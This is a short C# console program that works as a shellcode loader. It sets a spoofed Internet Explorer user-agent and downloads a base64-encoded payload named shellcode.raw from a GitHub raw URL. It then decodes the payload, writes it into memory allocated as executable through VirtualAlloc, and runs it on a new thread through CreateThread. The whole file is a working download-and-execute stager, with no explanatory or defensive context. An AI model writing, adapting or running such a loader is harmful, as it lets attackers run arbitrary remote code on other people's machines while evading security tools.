using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace ConsoleApp3
{
    class Program
    {
        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint flProtect);
        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        static void Main(string[] args)
        {

            WebClient client = new WebClient();
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            Stream encodedReader = client.OpenRead("https://raw.githubusercontent.com/barfedguy1996/fuzzy-bassoon/main/shellcode.raw");
            StreamReader reader = new StreamReader(encodedReader);
            string encodedString = reader.ReadToEnd();

            //Console.WriteLine(encodedString);

            encodedReader.Close();
            reader.Close();

            byte[] base64Data = Convert.FromBase64String(encodedString);

            IntPtr functionAddress = VirtualAlloc((uint) IntPtr.Zero, (uint)base64Data.Length, 0x00001000, 0x40);
            Marshal.Copy(base64Data, 0, functionAddress, base64Data.Length);


            IntPtr threadId = IntPtr.Zero;

            IntPtr hThread = CreateThread(IntPtr.Zero, (uint)base64Data.Length, functionAddress, IntPtr.Zero, 0, threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
 }
